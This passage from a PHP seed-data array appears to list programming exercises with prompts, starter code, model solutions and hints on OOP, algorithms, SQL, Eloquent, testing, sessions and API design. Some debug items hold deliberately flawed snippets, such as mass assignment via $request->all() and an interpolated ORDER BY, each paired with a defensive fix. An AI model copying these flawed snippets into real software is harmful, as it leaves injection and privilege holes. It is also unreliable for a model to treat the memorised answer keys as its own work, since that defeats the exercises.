                ['title' => 'L3 — Getter abuse', 'prompt' => 'Public getBalance + setBalance that allows -100 — is that encapsulation? Fix.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nclass Acc {\n    public function setBalance(float \$b): void { \$this->b = \$b; }\n}\n", 'solution' => 'Remove dumb setters; validate in withdraw/deposit; expose only balance() getter; make property private with invariant checks on mutation paths.', 'hints' => 'Validate on mutate.', 'order' => 3],
                ['title' => 'L6 — API evolution', 'prompt' => 'You must change internal representation of a public class — what keeps callers safe?', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Small public interface, private internals, tests on behavior not representation, no leaking arrays of internals, semver discipline.', 'hints' => 'Behavior tests.', 'order' => 6],
            ],
            'F3' => [
                ['title' => 'L1 — is-a test', 'prompt' => 'When is Child a Parent (LSP)?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Wherever Parent is expected, Child works without surprise — pre/post conditions and return contracts hold.', 'hints' => 'Substitutable.', 'order' => 1],
                ['title' => 'L4 — Shape hierarchy', 'prompt' => 'Design: Circle/Square without messy area() on Shape — visitor, interface, or match?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Interface AreaComputable::area(); or open match on type in one place if closed set. Avoid fat base class.', 'hints' => 'Interface vs open match.', 'order' => 4],
                ['title' => 'L5 — Fragile base', 'prompt' => 'Parent method uses protected hooks child overrides with side effects — risk?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Fragile base class: parent order changes break children. Prefer composition or explicit template method with documented hook order and tests.', 'hints' => 'Hook order.', 'order' => 5],
            ],
            'F4' => [
                ['title' => 'L1 — Favor composition', 'prompt' => 'One sentence: composition over inheritance.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Build by combining collaborating objects with clear roles rather than deep is-a trees that couple you to base class changes.', 'hints' => 'Has-a vs is-a.', 'order' => 1],
                ['title' => 'L3 — Diamond mess', 'prompt' => 'Multiple extends fails / confusing — redesign with interfaces + traits carefully.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nclass A {}\nclass B extends A {}\nclass C extends A {}\n// class D extends B, C {}\n", 'solution' => 'PHP forbids multiple class inheritance. Use interfaces for contracts and prefer injecting trait-provided behavior via composition.', 'hints' => 'Single class parent.', 'order' => 3],
                ['title' => 'L5 — SOLID smell scan', 'prompt' => 'Class does validation + HTTP + SQL + HTML. Name SOLID principles violated and first refactor.', 'level' => 5, 'type' => 'design', 'starter_code' => "// god controller\n", 'solution' => 'SRP (and OCP/DIP as written). Extract Validator, Repository, Presenter; inject them; controller only orchestrates.', 'hints' => 'SRP first.', 'order' => 5],
                ['title' => 'L6 — Design review', 'prompt' => 'Reviewer: "just extend BaseController for everything" — your response (4 bullets).', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Inheritance couples to base churn; shared helpers via traits/composition; interfaces for swapping; deep hierarchies slow onboarding. Prefer thin shared services.', 'hints' => 'Coupling + onboarding.', 'order' => 6],
            ],
            'F5' => [
                ['title' => 'L1 — Namespace purpose', 'prompt' => 'Why namespaces?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Avoid class name collisions and map cleanly to PSR-4 directories.', 'hints' => 'Collisions + autoload.', 'order' => 1],
                ['title' => 'L3 — Wrong import', 'prompt' => 'Class not found though file exists — check use/namespace/PSR-4.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nnamespace App\\Domain;\nclass Money {}\n// caller forgot?\n\$m = new \\App\\Domain\\Money();\n", 'solution' => 'Ensure composer PSR-4 App\\ → app/; import with use App\\Domain\\Money; dump-autoload; match directory casing.', 'hints' => 'PSR-4 + use.', 'order' => 3],
                ['title' => 'L4 — When enum over class', 'prompt' => 'Order status fixed set — enum or class constants? Design.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Backed string/int enum for fixed sets with match exhaustiveness; class constants legacy; objects when behavior/data per instance needed.', 'hints' => 'Fixed set → enum.', 'order' => 4],
                ['title' => 'L5 — Enum casting in Eloquent', 'prompt' => 'Storing enum in DB column — what cast and why?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Cast to enum class (e.g. Status::class) or store backing value with enum cast — keeps PHP type safety and DB portable strings.', 'hints' => 'Eloquent enum cast.', 'order' => 5],
                ['title' => 'L2 — Enum + match', 'prompt' => 'Order status backed enum + match that throws on unknown — write sketch.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nenum Status: string { case New = 'new'; case Paid = 'paid'; }\nfunction next(Status \$s): string {\n    // match\n}\n", 'solution' => "<?php\nenum Status: string { case New = 'new'; case Paid = 'paid'; }\nfunction next(Status \$s): string {\n    return match (\$s) {\n        Status::New => 'paid',\n        Status::Paid => 'shipped',\n    };\n}\n", 'hints' => 'match with enum cases.', 'order' => 7],
                ['title' => 'L3 — Reflection discover attributes', 'prompt' => 'Given a class with #[Deprecated] attribute, outline ReflectionClass + getAttributes() to print attribute names.', 'level' => 3, 'type' => 'code', 'starter_code' => "<?php\n\$rc = new ReflectionClass(MyService::class);\n// iterate attributes\n", 'solution' => "<?php\n\$rc = new ReflectionClass(MyService::class);\nforeach (\$rc->getAttributes() as \$attr) {\n    echo \$attr->getName(), PHP_EOL;\n}\n", 'hints' => 'getAttributes on ReflectionClass.', 'order' => 8],
                ['title' => 'L6 — Reflection trade-off', 'prompt' => 'When is runtime Reflection a design smell vs a legitimate tool? 4 bullets.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Smell: replacing normal OO calls, breaking encapsulation to poke privates, hiding deps. Legitimate: DI container wiring, serializers, test tools, attribute readers. Prefer explicit APIs in domain code; confine Reflection to infrastructure.', 'hints' => 'Tools vs domain.', 'order' => 9],
            ],
            'G1' => [
                ['title' => 'L2 — Trigger a notice', 'prompt' => 'Write code that would emit Undefined variable if not careful; then fix it with ?? or default.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// risky\n", 'solution' => "<?php\n\$name = 'x';\necho \$missing ?? 'n/a';\n", 'expected_output' => 'n/a', 'hints' => '?? null coalescing.', 'order' => 2],
                ['title' => 'L4 — Error policy', 'prompt' => 'Design: warnings in prod — convert to exceptions or log-only? Context for a library vs app.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'App: log + monitor; convert selected to ErrorException in dev/tests. Library: don’t throw on warnings globally; let host set handlers.', 'hints' => 'App vs library.', 'order' => 4],
                ['title' => 'L6 — Error philosophy', 'prompt' => 'Parse errors vs runtime exceptions — who should handle each in a deployed system?', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Parse = deploy/code bug → CI/static analysis/prevents ship; runtime domain errors → typed exceptions with recovery. Not try/catch around parse in request.', 'hints' => 'Prevent vs recover.', 'order' => 6],
            ],
            'G2' => [
                ['title' => 'L1 — Throwable hierarchy', 'prompt' => 'Exception vs Error in PHP 7+?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Both implement Throwable; Error is for engine problems (TypeError, OOM-ish); Exception for app-level failures. Catch thoughtfully.', 'hints' => 'Error vs Exception.', 'order' => 1],
                ['title' => 'L4 — Exception design', 'prompt' => 'Design PaymentDeclinedException: properties, context, message rules (no secrets).', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'code enum/string, safe public message, context array for logs (no PAN), previous exception chain, domain-specific type not generic Exception.', 'hints' => 'Safe context.', 'order' => 4],
                ['title' => 'L5 — finally', 'prompt' => 'When must you use finally instead of catch+code after try?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Release resources on all paths (locks, handles) even when rethrowing — finally always runs.', 'hints' => 'Always runs.', 'order' => 5],
            ],
            'G3' => [
                ['title' => 'L1 — Fail open vs closed', 'prompt' => 'In auth checks, which is safer: fail open or fail closed? Why?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Fail closed — deny on error. Fail open grants access when checks break (config missing, DB down).', 'hints' => 'Deny by default.', 'order' => 1],
                ['title' => 'L2 — Circuit sketch', 'prompt' => 'Describe retry with exponential backoff for a flaky HTTP call in prose + pseudo config.', 'level' => 2, 'type' => 'code', 'starter_code' => "// attempts, base, max\n", 'solution' => '3–5 attempts, base 200ms * 2^n, cap 5s, jitter, only idempotent ops, then fail to queue/alert.', 'hints' => '2^n + jitter.', 'order' => 2],
                ['title' => 'L6 — Recovery review', 'prompt' => 'Incident: payment webhook 500s due to uncaught TypeError after schema deploy. Postmortem action items (4).', 'level' => 6, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => '1) Expand/contract schema + types. 2) CI type checks/tests on payload. 3) Error budget alert on 5xx. 4) Runbook: rollback webhook consumer.', 'hints' => 'Schema + tests + alert.', 'order' => 6],
            ],
            'H1' => [
                ['title' => 'L2 — Classify complexity', 'prompt' => 'Classify: single loop O?; nested loop O?; binary search O?', 'level' => 2, 'type' => 'code', 'starter_code' => "// n = count\n", 'solution' => 'Loop O(n); nested O(n²); binary search O(log n).', 'hints' => 'Count growth.', 'order' => 2],
                ['title' => 'L4 — Optimize choice', 'prompt' => 'n=1e5, O(n²) too slow — name two algorithmic upgrades.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Sort + two pointers / hash set membership / binary search / prefix sums — depending on problem shape.', 'hints' => 'Hash or sort.', 'order' => 4],
                ['title' => 'L6 — Space-time', 'prompt' => 'Argue when trading memory for time is wrong (not just "cache it").', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'When memory is tighter than CPU (huge N), eviction complexity, or cache invalidation cost exceeds recompute — measure p99 and RAM budget first.', 'hints' => 'Budget + invalidation.', 'order' => 6],
            ],
            'H2' => [
                ['title' => 'L1 — Sorted precondition', 'prompt' => 'Why must binary search input be sorted?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'It discards half based on order; unsorted data makes half-elimination invalid → wrong misses.', 'hints' => 'Discard half.', 'order' => 1],
                ['title' => 'L4 — Stable sort need', 'prompt' => 'Sorting rows by score then id — need stable sort? Design comparison.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Compare score desc, then id asc — explicit tie-break makes stability irrelevant; or use stable sort.', 'hints' => 'Tie-break keys.', 'order' => 4],
                ['title' => 'L5 — Sorting huge file', 'prompt' => '10GB file, 16GB RAM — strategy without full array?', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'External sort: chunk to sorted temp runs, k-way merge; or bucket/partition by range in SQL/Spark-like steps.', 'hints' => 'External merge.', 'order' => 5],
                ['title' => 'L2 — Two Sum sketch', 'prompt' => 'Describe (or code) Two Sum with a hash map: complexity?', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nfunction twoSum(array \$nums, int \$target): array\n{\n    // return indices\n}\n", 'solution' => "<?php\nfunction twoSum(array \$nums, int \$target): array {\n    \$seen = [];\n    foreach (\$nums as \$i => \$n) {\n        if (isset(\$seen[\$target - \$n])) { return [\$seen[\$target - \$n], \$i]; }\n        \$seen[\$n] = \$i;\n    }\n    return [];\n}\n", 'hints' => 'Complement in map; O(n).', 'order' => 6],
                ['title' => 'L2 — Valid parentheses', 'prompt' => 'Use a stack to check if a brackets string is valid. Outline or code.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nfunction valid(string \$s): bool\n{\n    // stack of opens\n}\n", 'solution' => "<?php\nfunction valid(string \$s): bool {\n    \$stack = []; \$map = [')' => '(', ']' => '[', '}' => '{'];\n    for (\$i = 0; \$i < strlen(\$s); \$i++) {\n        \$c = \$s[\$i];\n        if (! isset(\$map[\$c])) { \$stack[] = \$c; continue; }\n        if (array_pop(\$stack) !== \$map[\$c]) { return false; }\n    }\n    return \$stack === [];\n}\n", 'expected_output' => '', 'hints' => 'Push opens, pop closes.', 'order' => 7],
                ['title' => 'L2 — Sliding window max sum', 'prompt' => 'Max sum of k consecutive elements — describe sliding window and complexity.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'First window sum, then slide: subtract outgoing, add incoming. O(n) time, O(1) extra space.', 'hints' => 'Slide subtract/add.', 'order' => 8],
                ['title' => 'L4 — Kadane explain', 'prompt' => 'Explain Kadane’s algorithm for maximum subarray in plain language.', 'level' => 4, 'type' => 'explain', 'starter_code' => null, 'solution' => 'At each index choose max(current element, current running sum + element); track global max. O(n).', 'hints' => 'Reset vs extend.', 'order' => 9],
                ['title' => 'L5 — Complexity interview drill', 'prompt' => 'Classify: nested loop, binary search, hash lookup, sort+scan.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Nested O(n²); binary O(log n); hash average O(1); sort+scan O(n log n).', 'hints' => 'Growth rates.', 'order' => 10],
            ],
            'H3' => [
                ['title' => 'L2 — DFS vs BFS output', 'prompt' => 'What traversal order do DFS and BFS give on a simple tree? One line each.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'BFS: level by level. DFS: deep first along branches (pre/in/post depend on visit timing).', 'hints' => 'Level vs depth.', 'order' => 2],
                ['title' => 'L4 — Graph modeling', 'prompt' => 'Model course prerequisites as a graph — what edge direction and what query for "can I take X"?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Edge A→B means A before B (or B depends on A — pick one and document). Can take X if no unresolved incoming deps / no cycle involving path from incomplete nodes.', 'hints' => 'DAG + indegree.', 'order' => 4],
                ['title' => 'L5 — Memo key design', 'prompt' => 'DP on grid path count — what is state and memo key? Overlap example.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'State: position (r,c) or remaining budget; memo key that tuple; overlapping subpaths from multiple starts to same cell counted once.', 'hints' => 'State = key.', 'order' => 5],
                ['title' => 'L6 — When not DP', 'prompt' => 'When is recursion + cache worse than iterative DP? 3 bullets.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Deep stacks overflow; huge call overhead; sparse huge memo thrash; harder profiling. Prefer iterative when state space is dense and stack risk real.', 'hints' => 'Stack + density.', 'order' => 6],
            ],
            'I1' => [
                ['title' => 'L2 — Blocking vs non-blocking', 'prompt' => 'Explain in 3 sentences with a cURL example intuition.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Blocking waits for response before continuing; non-blocking schedules many and resumes on events — more concurrency per process.', 'hints' => 'Wait vs schedule.', 'order' => 2],
                ['title' => 'L4 — Worker count', 'prompt' => 'FPM pm.max_children too high — what breaks? Too low?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Too high: memory blowup/context switch/DB pool exhaustion. Too low: queueing, latency. Size by RSS × children ≤ RAM and DB connection budget.', 'hints' => 'RAM and pool.', 'order' => 4],
                ['title' => 'L5 — When Fibers', 'prompt' => 'PHP Fibers — where useful vs still just use queues?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Fibers: cooperative multitasking inside one process (custom async runtimes, generators-style flows). Most web apps: still use FPM + queue workers for isolation.', 'hints' => 'Coop multitask.', 'order' => 5],
            ],
            'I2' => [
                ['title' => 'L1 — Queue benefit', 'prompt' => 'Why move slow work off the HTTP request?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Keep request latency predictable, survive retries, scale workers independently, avoid gateway timeouts.', 'hints' => 'Latency + retries.', 'order' => 1],
                ['title' => 'L4 — Job design', 'prompt' => 'Design SendInvoiceJob: idempotency key, retry policy, failure path.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Key invoice_id+period; tries with backoff; on permanent failure mark invoice + alert; payload ids only not full PII snapshots if avoidable.', 'hints' => 'Key + backoff.', 'order' => 4],
                ['title' => 'L6 — Race review', 'prompt' => 'Two workers decrement stock — show lost update and fix (SQL vs lock).', 'level' => 6, 'type' => 'design', 'starter_code' => "// read-modify-write\n", 'solution' => 'Lost update when both read 10 and write 9. Fix: UPDATE stock = stock - 1 WHERE stock >= 1; or SELECT FOR UPDATE in transaction; or atomic queue single consumer per SKU.', 'hints' => 'Atomic UPDATE.', 'order' => 6],
            ],
            'J1' => [
                ['title' => 'L1 — Arrange-Act-Assert', 'prompt' => 'Name the three parts of a test.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Arrange setup, Act exercise subject, Assert check expectation.', 'hints' => 'AAA.', 'order' => 1],
                ['title' => 'L3 — Flaky isolation', 'prompt' => 'Test order changes result — fix strategy.', 'level' => 3, 'type' => 'debug', 'starter_code' => "// shared static?\n", 'solution' => 'RefreshDatabase per test, no shared statics, freeze time, avoid parallel file writes — each test builds own state.', 'hints' => 'Isolate state.', 'order' => 3],
                ['title' => 'L5 — What not to test', 'prompt' => 'List 3 things you usually should not unit test.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Framework internals, trivial getters without logic, third-party vendor behavior — test your contracts instead.', 'hints' => 'Framework + vendor.', 'order' => 5],
                ['title' => 'L6 — Test pyramid', 'prompt' => 'Pyramid vs honeycomb — which for this Laravel app and why?', 'level' => 6, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Many fast unit/service tests, fewer feature HTTP tests, thin E2E — honeycomb if pure HTTP APIs with little UI logic. Cost of flaky UI highest.', 'hints' => 'Fast bulk, slow edge.', 'order' => 6],
            ],
            'J2' => [
                ['title' => 'L2 — Write a failing test', 'prompt' => 'Pest: write expect(strlen(""))->toBe(0) style for trim("  x  ")===\'x\'.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nit('trims', function () {\n    // ...\n});\n", 'solution' => "<?php\nit('trims', function () {\n    expect(trim('  x  '))->toBe('x');\n});\n", 'hints' => 'expect()->toBe().', 'order' => 2],
                ['title' => 'L4 — Double choice', 'prompt' => 'Stub vs mock vs fake — one line each for a payment client test.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Stub returns canned data; mock verifies interactions; fake is simple working in-memory impl (fake wallet).', 'hints' => 'Data vs calls vs impl.', 'order' => 4],
                ['title' => 'L5 — Coverage trap', 'prompt' => '90% line coverage but bugs ship — why? What metric next?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Coverage ≠ assertions of behavior; empty runs count. Prefer mutation testing / critical path feature tests / bug-fix regression tests.', 'hints' => 'Behavior not lines.', 'order' => 5],
            ],
            'K1' => [
                ['title' => 'L1 — SQL injection fix', 'prompt' => 'Why not concatenate user input into SQL?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Attackers inject SQL via quotes/operators; use prepared statements so data never becomes code.', 'hints' => 'Data vs code.', 'order' => 1],
                ['title' => 'L3 — Broken query', 'prompt' => 'ORDER BY with user column — injection via identifier. Fix safely.', 'level' => 3, 'type' => 'debug', 'starter_code' => "-- ORDER BY \$col\n", 'solution' => 'Whitelist allowed column names map: [\'name\' => \'name\', \'date\' => \'created_at\'] — never interpolate raw.', 'hints' => 'Whitelist ids.', 'order' => 3],
                ['title' => 'L4 — Index design', 'prompt' => 'Table users(email, created_at) — queries by email and by day. Indexes?', 'level' => 4, 'type' => 'design', 'starter_code' => "-- ...\n", 'solution' => 'UNIQUE index on email; index on created_at (or date(created_at) expression index) for day filters. Watch write cost and selectivity.', 'hints' => 'Unique + range.', 'order' => 4],
                ['title' => 'L5 — Migration safety', 'prompt' => 'Add NOT NULL column to large table — safe steps.', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Add nullable with default, backfill batched, then set NOT NULL in separate lock-friendly step; online DDL where supported.', 'hints' => 'Nullable then backfill.', 'order' => 5],
                ['title' => 'L2 — JOIN practice', 'prompt' => 'Write SQL: all users and their order counts (LEFT JOIN + GROUP BY).', 'level' => 2, 'type' => 'code', 'starter_code' => "SELECT ...\nFROM users\n-- join orders\n", 'solution' => 'SELECT u.id, COUNT(o.id) AS orders FROM users u LEFT JOIN orders o ON o.user_id = u.id GROUP BY u.id;', 'hints' => 'LEFT JOIN keeps users with 0.', 'order' => 6],
                ['title' => 'L4 — Index for this query', 'prompt' => 'Query: WHERE user_id = ? AND status = ? ORDER BY created_at DESC. Suggest an index.', 'level' => 4, 'type' => 'design', 'starter_code' => "-- ...\n", 'solution' => 'Composite index (user_id, status, created_at) — equality columns first, then ORDER BY column.', 'hints' => 'Equality then order.', 'order' => 7],
                ['title' => 'L5 — Deadlock fix', 'prompt' => 'Two txns lock rows in opposite order — how do you fix in application code?', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Always lock in a consistent order (e.g. by id ASC); keep transactions short; retry on deadlock.', 'hints' => 'Consistent order.', 'order' => 8],
            ],
            'K2' => [
                ['title' => 'L1 — Eager load why', 'prompt' => 'What does with(\'comments\') prevent?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'N+1 — one query for all comments instead of per post.', 'hints' => 'N+1.', 'order' => 1],
                ['title' => 'L4 — Query scope design', 'prompt' => 'activeUsers() scope — where does it live and why scopes?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Local scope on User model; reuse conditions, chainable, single definition vs copy-paste wheres.', 'hints' => 'Local scope.', 'order' => 4],
                ['title' => 'L5 — Soft delete pitfalls', 'prompt' => 'Soft deletes + unique email — conflict? Fix.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Unique blocks re-register of trashed email. Use soft-delete-aware unique (partial unique where deleted_at null) or force delete/archive rename.', 'hints' => 'Partial unique.', 'order' => 5],
                ['title' => 'L6 — Repository over Eloquent?', 'prompt' => 'Should every Eloquent model sit behind a repository? Balanced view.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Often overkill for CRUD apps; useful for isolating complex query language or swapping storage. Prefer query classes/services at seams you actually test with alternatives.', 'hints' => 'Only at real seams.', 'order' => 6],
                ['title' => 'L2 — Eloquent relationship', 'prompt' => 'User hasMany Post — write the relationship methods on both models (sketch).', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// User::posts()\n// Post::user()\n", 'solution' => "<?php\n// User: return \$this->hasMany(Post::class);\n// Post: return \$this->belongsTo(User::class);\n", 'hints' => 'hasMany / belongsTo.', 'order' => 7],
                ['title' => 'L4 — Mass assignment guard', 'prompt' => 'Controller does User::create($request->all()) — security issue and fix.', 'level' => 4, 'type' => 'debug', 'starter_code' => "User::create(\$request->all());\n", 'solution' => 'Use $request->validated() plus $fillable whitelist — never trust role/is_admin from client input.', 'hints' => 'validated + fillable.', 'order' => 8],
            ],
            'K3' => [
                ['title' => 'L1 — ACID letters', 'prompt' => 'Expand ACID one word each.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Atomicity, Consistency, Isolation, Durability.', 'hints' => 'A C I D.', 'order' => 1],
                ['title' => 'L3 — Deadlock scenario', 'prompt' => 'Two txns update rows A,B in opposite order — how to avoid?', 'level' => 3, 'type' => 'debug', 'starter_code' => "-- T1: A then B\n-- T2: B then A\n", 'solution' => 'Consistent lock order (always by id ASC); keep transactions short; retry on deadlock.', 'hints' => 'Same order.', 'order' => 3],
                ['title' => 'L4 — Isolation level', 'prompt' => 'Read committed vs repeatable read — pick for reporting snapshot and why.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Repeatable read or snapshot isolation for consistent report; accept slightly more contention. Document anomaly tolerance.', 'hints' => 'Snapshot for reports.', 'order' => 4],
                ['title' => 'L5 — explain analyze', 'prompt' => 'Query 2s — what do you look for in EXPLAIN?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'type ALL/index full scans, rows estimate, Extra filesort/temp table, missing index on join/filter keys.', 'hints' => 'ALL + rows + Extra.', 'order' => 5],
            ],
            'L1' => [
                ['title' => 'L2 — Cookie flags', 'prompt' => 'List security flags for a session cookie in prod.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'HttpOnly, Secure, SameSite=Lax/Strict, proper Domain/Path, reasonable lifetime.', 'hints' => 'HttpOnly Secure SameSite.', 'order' => 2],
                ['title' => 'L4 — Session fixation', 'prompt' => 'Attack + mitigation when user logs in.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Attacker sets known session id then victim auths it. Fix: regenerate id on login/regenerate privilege change.', 'hints' => 'Regenerate id.', 'order' => 4],
                ['title' => 'L5 — CSRF posture', 'prompt' => 'Why token on state-changing requests? GET should not mutate — how enforce?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Cross-site form posts lack custom headers/token check; use middleware + method discipline; tokens per session/request.', 'hints' => 'Token + methods.', 'order' => 5],
            ],
            'L2' => [
                ['title' => 'L1 — RBAC vs ABAC', 'prompt' => 'One line difference.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'RBAC: permission by role. ABAC: allow/deny by attributes (owner, dept, time) — more flexible, more complex.', 'hints' => 'Role vs attributes.', 'order' => 1],
                ['title' => 'L3 — Privilege bug', 'prompt' => 'Middleware checks is_admin but forgets email verified — what class of bug and fix?', 'level' => 3, 'type' => 'debug', 'starter_code' => "Route::middleware('admin')->...\n", 'solution' => 'Incomplete gate (authz and assurance). Stack verified + admin; default deny missing checks; tests for each rule.', 'hints' => 'Stack middleware.', 'order' => 3],
                ['title' => 'L5 — Password storage', 'prompt' => 'Why bcrypt/argon not sha256? Parameters thoughts.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Slow KDF + salt defeats rainbow/gpu; plain sha256 is fast to brute. Prefer argon2id or bcrypt with adequate cost; rehash on login when params change.', 'hints' => 'Slow KDF.', 'order' => 5],
                ['title' => 'L6 — Authz review', 'prompt' => 'IDOR: user changes id in URL and reads others\' invoices. Fix layers (3).', 'level' => 6, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Scope query by auth user id; policy/authorize in controller; tests for cross-tenant access 403/404; avoid sequential public ids if leaking.', 'hints' => 'Scope + policy + tests.', 'order' => 6],
            ],
            'L3' => [
                ['title' => 'L1 — OWASP top risk name', 'prompt' => 'Name 3 OWASP-style risks relevant to a Laravel CRUD app.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Broken access control, injection, security misconfiguration (examples).', 'hints' => 'Access + injection + config.', 'order' => 1],
                ['title' => 'L2 — Escape output', 'prompt' => 'Show escaping user bio for HTML body context (raw PHP).', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\$bio = \$_POST['bio'] ?? '';\n// safe HTML body\n", 'solution' => "<?php\n\$bio = \$_POST['bio'] ?? '';\necho htmlspecialchars(\$bio, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');\n", 'hints' => 'htmlspecialchars.', 'order' => 2],
                ['title' => 'L4 — Threat model', 'prompt' => 'Threat model a public pastebin: assets, attackers, 3 controls.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Assets: content integrity, availability, secrets in pastes. Controls: rate limits, size caps, auth optional, scan malware links, expiry, no raw HTML render.', 'hints' => 'Rate + cap + render safe.', 'order' => 4],
                ['title' => 'L5 — Secrets in repo', 'prompt' => 'API key committed — response plan and prevention.', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Rotate immediately, purge history if needed, audit usage; prevent: .env only, pre-commit hooks, secret scanning, least-privilege keys.', 'hints' => 'Rotate first.', 'order' => 5],
            ],
            'L4' => [
                ['title' => 'L1 — Idempotency', 'prompt' => 'What is an idempotent HTTP method? Which are not by default?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'GET/PUT/DELETE intended idempotent; POST not — repeated POST may create twice without keys.', 'hints' => 'PUT/DELETE yes.', 'order' => 1],
                ['title' => 'L3 — Wrong status', 'prompt' => 'API returns 200 with error JSON only — problems? Better?', 'level' => 3, 'type' => 'debug', 'starter_code' => "// 200 always\n", 'solution' => 'Breaks HTTP caches/clients/monitors. Use 4xx/5xx with problem+json or consistent error envelope.', 'hints' => 'Status codes matter.', 'order' => 3],
                ['title' => 'L4 — Pagination design', 'prompt' => 'Offset vs cursor pagination for infinite scroll — pick and justify.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Cursor on id/created_at for stable O(1) deep pages; offset simpler but skips/dupes under inserts and slows deep.', 'hints' => 'Cursor stable.', 'order' => 4],
                ['title' => 'L5 — Versioning', 'prompt' => 'How to evolve breaking API changes? Two strategies.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'URL/header versioning (v1/v2) with deprecation timeline; or additive-only changes with sunset headers for old fields.', 'hints' => 'Version or additive.', 'order' => 5],
                ['title' => 'L6 — Contract review', 'prompt' => 'Review: PUT replaces entire resource, PATCH partial — team uses PUT for both. Risks?', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Accidental field wipes if clients omit keys; inconsistent semantics; harder caching. Either document full-replace clearly or move partial updates to PATCH/merge-patch.', 'hints' => 'Replace vs partial.', 'order' => 6],
                ['title' => 'L2 — Status codes drill', 'prompt' => 'Map: created, no content, unauthorized, forbidden, not found, conflict.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => '201 Created; 204 No Content; 401 Unauthorized; 403 Forbidden; 404 Not Found; 409 Conflict.', 'hints' => '2xx 4xx map.', 'order' => 7],
                ['title' => 'L4 — Idempotent create', 'prompt' => 'How do you make POST /orders safe to retry?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Client sends Idempotency-Key; store key → response; return original response on duplicate.', 'hints' => 'Idempotency-Key.', 'order' => 8],
            ],
            'M1' => [
